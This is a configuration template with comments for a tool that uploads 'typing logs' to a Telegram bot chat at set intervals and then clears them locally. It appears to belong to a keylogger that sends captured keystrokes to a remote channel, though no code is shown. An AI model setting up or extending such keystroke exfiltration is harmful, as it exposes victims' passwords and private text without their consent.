# Telegram Bot API settings used to upload typing logs as a .txt file.
# 1. Talk to @BotFather, create a bot and copy its token here.
# 2. Add the bot to your group/channel and put the chat id below.
#    Group/supergroup ids are usually negative, e.g. -1001234567890
TELEGRAM_BOT_TOKEN=
TELEGRAM_CHAT_ID=

# How often logs are uploaded to Telegram and then cleared locally.
# Supported: 30m | 1h | 1d (also plain minutes, e.g. 45)
TELEGRAM_SEND_INTERVAL=1h
